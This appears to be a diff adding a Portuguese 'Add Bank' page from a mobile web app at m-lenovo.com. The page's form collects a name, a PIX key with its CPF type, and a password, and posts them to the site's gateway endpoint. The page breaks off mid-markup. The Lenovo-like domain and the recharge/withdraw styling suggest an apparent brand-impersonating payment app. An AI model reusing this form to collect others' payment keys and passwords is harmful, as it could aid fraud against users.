@@ -1,0 +1,210 @@
+<html lang="pt-BR" style="--status-bar-height: 0px; --top-window-height: 0px; --window-left: 0px; --window-right: 0px; --window-margin: 0px; --window-top: calc(var(--top-window-height) + 0px); --window-bottom: 0px;">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Add Bank</title>
+        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://m-lenovo.com/public/static/index.2da1efab.css">
+        <link rel="stylesheet" href="https://m-lenovo.com/public/bank.css">
+        <style>
+            .withdraws .apply-amount .balance-text[data-v-1db404bd] {
+                width: 100%;
+                margin: 5px 0 10px;
+                text-align: center;
+                font-weight: 400;
+                font-size: 21px;
+                color: #94512a;
+                background-size: 100% 100%
+            }
+
+            .list .item[data-v-a8b035b4] {
+                background: url(https://m-lenovo.com/public/static/img/bjtu@2x.7eaf5e98.png) 50% no-repeat;
+                background-size: 100% 100%;
+                padding: 16px;
+                font-size: 17px;
+                font-family: PingFang SC;
+                font-weight: 500;
+                color: #fff
+            }
+
+            .recharge .recharge-container .amount-container .balance-text[data-v-069fc72c] {
+                width: 100%;
+                margin: 5px 0 10px;
+                text-align: center;
+                font-weight: 400;
+                font-size: 21px;
+                color: #94512a;
+                background-size: 100% 100%;
+            }
+
+            .login[data-v-5df49fe2] {
+                min-height: 100vh;
+                position: relative;
+                z-index: 1;
+                background: url(https://m-lenovo.com/public/static/img/bg@2x.fb3f2d29.png) no-repeat;
+                background-size: 100% 100%;
+                overflow-x: hidden;
+                font-color: #fff
+            }
+
+            select:focus-visible {
+                outline: none;
+                border: none;
+            }
+
+            select#gateway_method {
+                font-size: 15px;
+                color: #7b6161;
+            }
+        </style>
+    </head>
+    <body class="uni-body pages-mine-bindBank" style="overflow: visible;">
+        <uni-app class="uni-app--maxwidth">
+            <uni-page data-page="pages/mine/bindBank">
+                <uni-page-wrapper>
+                    <uni-page-body>
+                        <uni-view data-v-78a1d2e4="">
+                            <div data-v-78a1d2e4="" class="bind-card">
+                                <div data-v-78a1d2e4="" class="header">
+                                    <div data-v-78a1d2e4="" class="navboxi van-nav-bar van-hairline--bottom">
+                                        <div data-v-78a1d2e4="" class=" display-center-center">
+                                            <div data-v-78a1d2e4="" class="van-nav-bar__left" onclick="window.location.href='https://m-lenovo.com/profile'">
+                                                <img style="width: 20px;height: 20px;" src="https://m-lenovo.com/public/icons8-up-left-48.png" alt="">
+                                            </div>
+                                            <div data-v-78a1d2e4="" class="van-nav-bar__center van-ellipsis">Conta Bancária
+                                    </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div data-v-78a1d2e4="" class="register-container">
+                                    <form action="https://m-lenovo.com/setup/gateway" method="post">
+                                        <input type="hidden" name="_token" value="CVPVU2tbTmHuo5B65tYSly2xe2J4FAGdD6A0U7ii">
+                                        <div data-v-78a1d2e4="" class="page-title">
+                                            <p data-v-78a1d2e4="">Adicione sua conta Bancária</p>
+                                        </div>
+                                        <div data-v-78a1d2e4="" class="register">
+                                            <p data-v-78a1d2e4="" class="actualname">Nome</p>
+                                            <div data-v-78a1d2e4="" class="van-cell-group van-hairline--top-bottom">
+                                                <div data-v-78a1d2e4="" class="van-cell van-field">
+                                                    <img data-v-78a1d2e4="" src="data:image/png;base64,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" class="icon_bank">
+                                                    <div data-v-78a1d2e4="" class="van-cell__value van-cell__value--alone van-field__value">
+                                                        <div data-v-78a1d2e4="" class="van-field__body" style="border-bottom: 1px solid rgb(206, 206, 206);">
+                                                            <uni-input data-v-78a1d2e4="" autocomplete="off" class="van-field__control">
+                                                                <div class="uni-input-wrapper">
+                                                                    <input maxlength="140" step="" placeholder="Por favor insira seu nome" name="name" autocomplete="off" type="text" class="uni-input-input">
+                                                                </div>
+                                                            </uni-input>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p data-v-78a1d2e4="" class="actualname">Método de Pagamento</p>
+                                            <div data-v-78a1d2e4="" class="van-cell-group van-hairline--top-bottom">
+                                                <div data-v-78a1d2e4="" class="van-cell van-field">
+                                                    <img data-v-78a1d2e4="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEcAAABCCAYAAAAFfcusAAAAAXNSR0IArs4c6QAABSxJREFUeF7tm11sFFUUx//n7m63awhgSRF2ly+rCVr1oYkkPlk1xNREOpJMadTdrinWB2MiEBITRRc/okaCUUHxAyxbTCErdhcSangBQwwhjbxI1IAIul1KWyghAbp0d+doMa3Qzkxnlym10zuvc8655/zmzNxzz71DmOCre+WyO3IDtAYgFeA5YOqAEBv8f/bto4MHcxPpHk3U4KnwsgcEiVXMXE+gUh0/joPpY1/GvaMsHr84EX7eUjgHqqvdi+fPXMqgtQx+xErADFwg0BelLm3zrK+TKSs6dsncEjjnn6mZflWUrmDCaoAXF+U8Iwfwt0JzbZz7zXcdRdkoUGlc4Zx5evkCuLVGBl4EUFagb2biRwB698qMzPd3f9J+1Ua7N5gaFzjpZ5dXkdBeBqiewZ7xch5AJ5jeo1xul7917zm7x7ENDqtqyVlf9rE8sI6Ah+x2dAx7V0DYVMK0tTzWdtyusW8aTl+TOuNyf65OEK8DMM8ux4q1w4zdwsUf+ZuTh4q1MaRXNJyuiLIwz7ySmFYBuO1mHbFbnxk/C1A0n3G3z4vH+4uxXzCcVFhZIhirQVhRzIC3Xod6NfA72ay2887WPd2FjG8JDjc1edKZ3scF4XVmfrCQAf4vsgxkifkzgtjib2n71YpfpnBSjWqZayBXx8TrAcy2YnCSyOzPMb11JOM+XBeP54181oXzV4NSIYBGYqwBUDJJAi7GzVOs4ZWS6Z59sz+NXxppYBgOR6MidfJolYvEawBqixlp8urwZTC9mc9qO+bv3HNmeLZKqarP5c09zEL7EKDiSvvJS2WU5wLYxsL1gb9592+UblD2g7HUQfHZFAoplA4rbJM1p5lZL+EYP9L1lA4pP4Jw37AM45/CEtOclgZm8VyrgYDhKpqBPJGI6E7l6bCyC0DdFAGUZ9C9QZ0Fqy6cs5Ha+7U8HWLCDEcDYjADXwZbEi/oxWlYIZ+oqfFOK/M+qrl4kVMBuVhrn9Oy91RBFbJTYRQal6WF56DREy/VeGde9syinFdXp78ffXqtAVZV1zlvfjYJl9Bz7mI/LlWM2F1ggLpDT5W7ya3bRcwglwnG2s7r2RtcD/qy8Ond0wTy5Qsreyga1ayAsgynM6zsI6DGyCgz/gi2JCpG3u8M1b5NRK8a6gFX2ePxz9sa7xuS6WxQ6ogxOCkYXiIvloxstHc1PFmpseuYaeDEawPbkxtshZMOKadBWGBmNBBLjIJ9Jqw0M9BgGqjAornNidNDMumwEgXwhun0y3gu2JJovl6mK6JUaxoOmOkRsN0fS0QkHB0CEo5JWkg4Eo785hjmAMsPsvH7IeGYfDskHAkHELIINFkKSDgSjlxbGeWAXHiazCASjoQzmoDs55hkhYQj4dxAwHIPWWaOzByZObLBbvAWyB6y7CHLHrLsIU+qZtcxVS253TewCaD/TnwBVQC8Y2yjHta5fxeActMtWsJRZlz/39TgDyZB0+1g4CQBPdfLEGg6gyvH8LEXwO//ypAG1loDLcnNejq6RWBnSPmcCE1W9pOdIcP1gVhy1MEFo2NvFwDMdEbglqLYFoglGkdKGsGZUsdvjWoffTih2lYQ1Vti7gghfj4QS35lKXMcEa8NQVheldsw1qQzcQ1OT+SJOVnNs5qZnH201sLjIeKOoVfsGpx0WPkFwD0WdKeECIPWBGNtG2nwH3AI7acpEbXFIBn4IRhLVJOVQ4YWbTpGTMIxeZQSjhU4Pao6LVuabQeZL/Qc885YCoS3BGLJ9/8G6h0YbHWUR/oAAAAASUVORK5CYII=" class="icon_bank">
+                                                    <div data-v-78a1d2e4="" class="van-cell__value van-cell__value--alone van-field__value">
+                                                        <div data-v-78a1d2e4="" class="van-field__body" style="border-bottom: 1px solid rgb(206, 206, 206);">
+                                                            <uni-input data-v-78a1d2e4="" autocomplete="off" class="van-field__control">
+                                                                <div class="uni-input-wrapper">
+                                                                    <select name="gateway_method" id="gateway_method" class="bank_select" style="border: none;">
+                                                                        <option value="PIX">PIX</option>
+                                                                    </select>
+                                                                </div>
+                                                            </uni-input>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p data-v-78a1d2e4="" class="actualname">Chave PIX</p>
+                                            <div data-v-78a1d2e4="" class="van-cell-group van-hairline--top-bottom">
+                                                <div data-v-78a1d2e4="" class="van-cell van-field">
+                                                    <img data-v-78a1d2e4="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAABCCAYAAADNESF6AAAAAXNSR0IArs4c6QAAA9BJREFUeF7tnE1oE0EUx/9vo9TWoiIqkkZERKEo6kXwotST1lKTFHJRsxGR4k28KoKgHgWv4sUmRUXRprV48NIqYhUEP9CTxYNN4rdU/E6bebKpEb/ZpvNCa94eEnaZ/c2b374dZgZmCd+OTCLsEtMeAGsA1Jau678vA28I6GfDxxo6u294d5D3k4tHTjCh3RdCC/3dAGMUDtyGjvQZyrjRBIFPqS9LBhijhk0jZd3wAEDrLGEVM9YNHPbEfgJohhqxZ4CBXsq6EbaHVJJngBn9KlYgF4piM26kX4Bd1UiHcKc43NLDvgEVa99pkahipcRm4pGdQuyqxTrgpzoqEHj8OtwSkKrjWCGpKlbFChoQQmsfq2KFDAhhx9YKdBxrXS+zeaYzL+tax4AqVsUKGRDCUi4R6RNiVzP2rq4VCDx+HccKSNUprZBUFatiBQ0IobWPVbFCBoSwmrEqVsiAEFYzdjKKZcZbAoatx0ZYbJ1ZYWBZGUuE5wXDuxalui9LxNvX1DRteWjOATg4JMGvBLMcsQUGrQ8luwaEA6RcPHyMifYJ1yOCL0fs7YZkeq1INL9Ac+2tdfw58KESddmuoxyxVxqS6U2lQHLtrfMK+cBKG4EF2DHBjovXSqxHzc01dfNrPttgV5oxYbFD8WibQ3zBRuAM5EPJdI2KBaBi/5xSmrE2XrU/MFSsihUyIITVjFWxQgaEsP9fxjIGCTjLhIJfZ0yoJ+btAC387R7GaZC3HsIJgGb6Zpaxge6nCcJkG27lneHaJaf6xz2pGIrF5tKMkcdEmF2SR0ztwVTXSe88l9i6gdm5WpVimTEYSqWX+W38r+WybvQewKtK1w3M6kXJnvul86wbfgvQLD/8/64roJHC/OCZS6/8NP7HMs8TkaWjjHsAvr/uzDgSSqUPeuWexqMxQ3zOL3fCYnPb2habgNnot8J/lmM2oc7u5ESmtAx8AXCeCKN+YyKmegZvAVD3+z18k+C8ZvBmAAG/zHGLZcatUCpdkW8bDMVitU7tyEe/jZlM5cYtFkB+ujErFnT2DEo3JOdG9jJwXLoeCX45Yr04MgGm5oWprgciQQGUdaPuVP6cSrliiz4J9BDEL23KNQwioBHAApvcSrMmJLbSwU6l+lSs0NNSsSpWyIAQVjNWxQoZEMKOZWw88g6EeqE6qhPLSHtbPvuI0FSdBmRaTeADlNmxtYUcp1emiuqjMjA84uQbi1s+M254P4GOVp8Gyy1mvCfHtAQ7eq5930vrrZKDnd3MxQ/z+lrQtRzWlMUR8MKArzsoHA+mep94DfkKqHxusp/8EjcAAAAASUVORK5CYII=" class="icon_bank">
+                                                    <div data-v-78a1d2e4="" class="van-cell__value van-cell__value--alone van-field__value">
+                                                        <div data-v-78a1d2e4="" class="van-field__body" style="border-bottom: 1px solid rgb(206, 206, 206);">
+                                                            <uni-input data-v-78a1d2e4="" autocomplete="off" class="van-field__control">
+                                                                <div class="uni-input-wrapper">
+                                                                    <input maxlength="60" step="" placeholder="Defina a chave PIX" autocomplete="off" type="text" name="pix_key" id="pix_key" class="uni-input-input">
+                                                                </div>
+                                                            </uni-input>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p data-v-78a1d2e4="" class="actualname">Tipo de Chave PIX</p>
+                                            <div data-v-78a1d2e4="" class="van-cell-group van-hairline--top-bottom">
+                                                <div data-v-78a1d2e4="" class="van-cell van-field">
+                                                    <img data-v-78a1d2e4="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAABCCAYAAADNESF6AAAAAXNSR0IArs4c6QAAA9BJREFUeF7tnE1oE0EUx/9vo9TWoiIqkkZERKEo6kXwotST1lKTFHJRsxGR4k28KoKgHgWv4sUmRUXRprV48NIqYhUEP9CTxYNN4rdU/E6bebKpEb/ZpvNCa94eEnaZ/c2b374dZgZmCd+OTCLsEtMeAGsA1Jau678vA28I6GfDxxo6u294d5D3k4tHTjCh3RdCC/3dAGMUDtyGjvQZyrjRBIFPqS9LBhijhk0jZd3wAEDrLGEVM9YNHPbEfgJohhqxZ4CBXsq6EbaHVJJngBn9KlYgF4piM26kX4Bd1UiHcKc43NLDvgEVa99pkahipcRm4pGdQuyqxTrgpzoqEHj8OtwSkKrjWCGpKlbFChoQQmsfq2KFDAhhx9YKdBxrXS+zeaYzL+tax4AqVsUKGRDCUi4R6RNiVzP2rq4VCDx+HccKSNUprZBUFatiBQ0IobWPVbFCBoSwmrEqVsiAEFYzdjKKZcZbAoatx0ZYbJ1ZYWBZGUuE5wXDuxalui9LxNvX1DRteWjOATg4JMGvBLMcsQUGrQ8luwaEA6RcPHyMifYJ1yOCL0fs7YZkeq1INL9Ac+2tdfw58KESddmuoxyxVxqS6U2lQHLtrfMK+cBKG4EF2DHBjovXSqxHzc01dfNrPttgV5oxYbFD8WibQ3zBRuAM5EPJdI2KBaBi/5xSmrE2XrU/MFSsihUyIITVjFWxQgaEsP9fxjIGCTjLhIJfZ0yoJ+btAC387R7GaZC3HsIJgGb6Zpaxge6nCcJkG27lneHaJaf6xz2pGIrF5tKMkcdEmF2SR0ztwVTXSe88l9i6gdm5WpVimTEYSqWX+W38r+WybvQewKtK1w3M6kXJnvul86wbfgvQLD/8/64roJHC/OCZS6/8NP7HMs8TkaWjjHsAvr/uzDgSSqUPeuWexqMxQ3zOL3fCYnPb2habgNnot8J/lmM2oc7u5ESmtAx8AXCeCKN+YyKmegZvAVD3+z18k+C8ZvBmAAG/zHGLZcatUCpdkW8bDMVitU7tyEe/jZlM5cYtFkB+ujErFnT2DEo3JOdG9jJwXLoeCX45Yr04MgGm5oWprgciQQGUdaPuVP6cSrliiz4J9BDEL23KNQwioBHAApvcSrMmJLbSwU6l+lSs0NNSsSpWyIAQVjNWxQoZEMKOZWw88g6EeqE6qhPLSHtbPvuI0FSdBmRaTeADlNmxtYUcp1emiuqjMjA84uQbi1s+M254P4GOVp8Gyy1mvCfHtAQ7eq5930vrrZKDnd3MxQ/z+lrQtRzWlMUR8MKArzsoHA+mep94DfkKqHxusp/8EjcAAAAASUVORK5CYII=" class="icon_bank">
+                                                    <div data-v-78a1d2e4="" class="van-cell__value van-cell__value--alone van-field__value">
+                                                        <div data-v-78a1d2e4="" class="van-field__body" style="border-bottom: 1px solid rgb(206, 206, 206);">
+                                                            <uni-input data-v-78a1d2e4="" autocomplete="off" class="van-field__control">
+                                                                <div class="uni-input-wrapper">
+                                                                    <select name="pix_key_type" id="pix_key_type" class="form-input bank_select">
+                                                                        <option value="CPF">CPF</option>
+                                                                    </select>
+                                                                </div>
+                                                            </uni-input>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p data-v-78a1d2e4="" class="actualname">Senha</p>
+                                            <div data-v-78a1d2e4="" class="van-cell-group van-hairline--top-bottom">
+                                                <div data-v-78a1d2e4="" class="van-cell van-field">
+                                                    <img data-v-78a1d2e4="" src="data:image/png;base64,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" class="icon_bank">
+                                                    <div data-v-78a1d2e4="" class="van-cell__value van-cell__value--alone van-field__value">
+                                                        <div data-v-78a1d2e4="" class="van-field__body" style="border-bottom: 1px solid rgb(206, 206, 206);">
+                                                            <uni-input data-v-78a1d2e4="" autocomplete="off" class="van-field__control">
+                                                                <div class="uni-input-wrapper">
+                                                                    <input step="" placeholder="Por favor insira sua senha" name="w_password" autocomplete="off" type="password" class="uni-input-input">
+                                                                </div>
+                                                            </uni-input>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <uni-button data-v-78a1d2e4="" onclick="bank()" class="registerBtn van-button van-button--primary van-button--normal van-button--block" style="background-color: rgb(229, 94, 80);">
+                                                <div data-v-78a1d2e4="" class="van-button__content">
+                                                    <span data-v-78a1d2e4="" class="van-button__text">Confirmar</span>
+                                                </div>
+                                            </uni-button>
+                                        </div>
+                                    </form>
+                                </div>
+                                <div data-v-78a1d2e4="" class="van-overlay" style="background: rgba(0, 0, 0, 0); display: none;">
+                                    <div data-v-78a1d2e4="" class="loading-box-h">
